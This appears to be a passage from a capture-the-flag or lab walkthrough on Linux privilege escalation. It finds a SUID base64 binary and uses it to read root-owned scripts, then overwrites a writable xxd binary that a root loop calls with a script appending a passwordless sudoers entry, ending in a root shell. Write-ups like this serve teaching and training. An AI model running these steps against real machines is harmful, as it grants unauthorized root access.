#### Look to Identify any Vulnerable Scripts
```bash
ps aux | grep root
```
- `/root/keygen/run.sh` script is running, but we don't have a privilege to read the script.

#### Look for other Vulnerabilities
```bash
find / -type f -perm -4000 2>/dev/null
```
- `/usr/bin/base64` has ***SUID*** bit enabled.
- Look for the ***base64*** in `GTFOBins`.

#### Use `base64` to read the Script
```bash
base64 /root/keygen/run.sh | base64 -d
```

**Output**
```bash
#!/bin/bash

while /bin/true; do
    /root/keygen/keygen.sh
	sleep 60
done &
```

#### Use `base64` to read the `keygen.sh` Script
```bash
base64 /root/keygen/keygen.sh | base64 -d
```

**Output**
```bash
#!/bin/bash

base32 /home/merle/keygen/devkey > /var/keys/base32/secretkey
base64 /home/merle/keygen/devkey > /var/keys/base64/secretkey
xxd -pu /home/merle/keygen/devkey > /var/keys/hex/hexkey
```
- This script is under the `root` folder and running the `xxd` binary inside it, which means if I can manage to change the `xxd` binary to the my code, then it will execute my code.

## `xxd` is not using the full path making it a good candidate for privilege escalation.
#### Enumerate `xxd`
**Check the location**
```bash
which xxd

# output
/usr/bin/xxd
``` 

**Check Permissions and the file owner**
```bash
ls -al /usr/bin/xxd

# output
-rwsr-xr-x 1 merle merle 18712 Feb  1  2022 /usr/bin/xxd
```
- Even though the `xxd` binary is owned by the user `merle`, the script `/root/keygen/keygen.sh` calls this binary from `root` providing us an elevated privilege.

#### Create a Script to add the user `merle` to Sudoers list
```bash
vim xxd
```

```bash
#!/bin/bash
echo "merle ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

```bash
chmod +x xxd
```

## Important Consideration
- **PATH Hijacking won't work here** because when you export the `/tmp` folder and place your malicious `xxd` inside it. You are ***only modifying the environment of your current shell session*** - ***not root's***.
- So, when the root-owned `keygen.sh` runs, it doesn't user your PATH.

#### Overwrite the `/usr/bin/xxd` binary with `cp`
```bash
cp xxd /usr/bin/xxd
```

#### Escalate to the Root user
```bash
sudo su root
```







